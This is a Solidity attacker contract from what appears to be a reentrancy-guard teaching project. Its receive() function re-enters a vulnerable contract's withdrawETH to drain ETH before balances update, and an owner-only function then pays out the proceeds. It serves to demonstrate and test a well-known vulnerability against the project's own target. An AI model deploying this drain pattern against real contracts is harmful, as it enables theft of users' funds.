// SPDX-License-Identifier: MIT

/// @title AttackerContract for BuildsWithKing-ReentrancyGuard. 
/// @author Michealking (@BuildsWithKing).
/// @notice Created on 24th of Aug, 2025. 

/** This contract exploits the vulnerable contract by recursively calling withdraw(), 
    before the balance is updated. 
 */

pragma solidity ^0.8.30;

/// @notice imports vulnerable contract. 
import{VulnerableContract} from "./VulnerableContract.sol";

contract AttackerContract {

/// @notice Assigns attacker. 
address private attacker;

/// @dev Thrown when attacker's withdrawal fails. 
error WithdrawalFailed();

/// @dev Thrown if caller is not attacker. 
error Unauthorized();

// ------------------------------------------ Variable Assignment ------------------------------------

    /// @notice Assigns vulnerableContract. 
    VulnerableContract vulnerableContract; 

    /// @notice Sets minimum deposit amount to $5. 
    uint256 constant MINIMUM_DEPOSIT = 0.001 ether;

// ------------------------------------------- Event ---------------------------------------------------

    /// @notice Emits EthDeposited.
    /// @param contractAddress The depositing contract address. 
    /// @param ethAmount Amount of ETH deposited. 
    event EthDeposited(
        address indexed contractAddress,
        uint256 indexed ethAmount
    );

     /// @notice Emit EthWithdrawn.
    /// @param attackerAddress The attacker's withdrawal address. 
    /// @param ethAmount Amount of ETH withdrawn. 
    event EthWithdrawn(
         address indexed attackerAddress,
        uint256 indexed ethAmount
    );

// ----------------------------------------- Constructor ----------------------------------------------

    /// @notice Sets the contract to be attacked. 
    constructor(address payable _contractAddress) {
        vulnerableContract = VulnerableContract(_contractAddress);
        attacker = msg.sender;
    }

// ------------------------------------------- Write Function -------------------------------------
    
    /// @notice Starts attack. 
    function startAttack() external payable {

        // Fund contract. 
        vulnerableContract.depositETH{value: msg.value}();

        // Withdraw from contract. 
        vulnerableContract.withdrawETH(msg.value);
    }

    /// @notice Allows attacker withdraw ETH. 
    function withdrawETH(uint256 _amount, address _userAddress) external {

        // Restricts access to only attacker. 
        if(msg.sender != attacker) revert Unauthorized();

        // Fund attacker amount withdrawn. 
        (bool success,) = payable(_userAddress).call{value: _amount}("");
        if(!success) 
        revert WithdrawalFailed(); 

        // Emit event EthWithdrawn. 
        emit EthWithdrawn(msg.sender, _amount);
    }

// ----------------------------------------- Read Function ------------------------------------------
    
    /// @notice Returns contract balance.
    /// @return Contract balance. 
    function getContractBalance() external view returns(uint256) {
        return address(this).balance;
    }

    /// @notice Returns Attacker's address.
    /// @return Attacker's address. 
    function getAttacker() external view returns(address) {
        return attacker;
    }

// ----------------------------------------- Receive function ---------------------------------------

    /// @notice Accepts Eth with no calldata. 
    receive() external payable {
        
        // Withdraw ETH if contract balance is greater or equal minimum deposit.  
        if(address(vulnerableContract).balance >= MINIMUM_DEPOSIT) {

            // Reentrant call. 
            vulnerableContract.withdrawETH(msg.value);
        }

        // Emit event EthDeposit. 
        emit EthDeposited(msg.sender, msg.value);
    }
}